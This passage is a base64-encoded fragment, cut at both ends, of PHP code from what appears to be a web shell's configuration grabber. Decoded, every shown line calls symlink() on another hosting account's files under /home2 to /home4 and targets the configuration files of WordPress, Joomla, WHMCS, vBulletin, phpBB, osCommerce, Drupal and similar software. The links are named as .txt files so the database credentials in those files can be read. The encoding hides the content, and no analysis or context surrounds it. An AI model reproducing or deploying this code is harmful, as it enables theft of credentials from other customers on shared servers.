ZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdGluZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC50eHQnKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC96ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC1zaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5ob3AtWkNzaG9wLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtc21mLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS50eHQnKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8udHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi1mb3J1bS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+T3RoZXIudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy50eHQnKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudHMudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmdzLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0udHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGRvbWFpbi4nfn4+d2htY3MyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5teXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2FsZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1iZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy1iZXRhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ob21lLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1tYWluLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtdGVzdC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtcHJvdGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXNpdGUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0udHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52Yi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5wYW5lbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PmhvcC1aQ3Nob3AudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWtfY29uZi5waHAnLCRwZG9tYWluLid+fj5tay1wb3J0YWxlMS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NtZi9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW0udHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW1zL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtcy50eHQnKTsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC91cGxvYWQvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dXBsb2FkLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbC9jb25maWcucGhwJywkZG9tYWluLid+fj5tYWxheS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGVzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGVudHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnL2tvbmVrc2kucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25maWcucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hZG1pbi9jb25mLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWExLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3N5c3RlbS9zaXN0ZW0ucGhwJywkZG9tYWluLid+fj5sb2tvbWVkaWEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcudHh0Jyk7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi50eHQnKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8udHh0Jyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTQvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkudHh0Jyk7DQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU0LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNC8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZX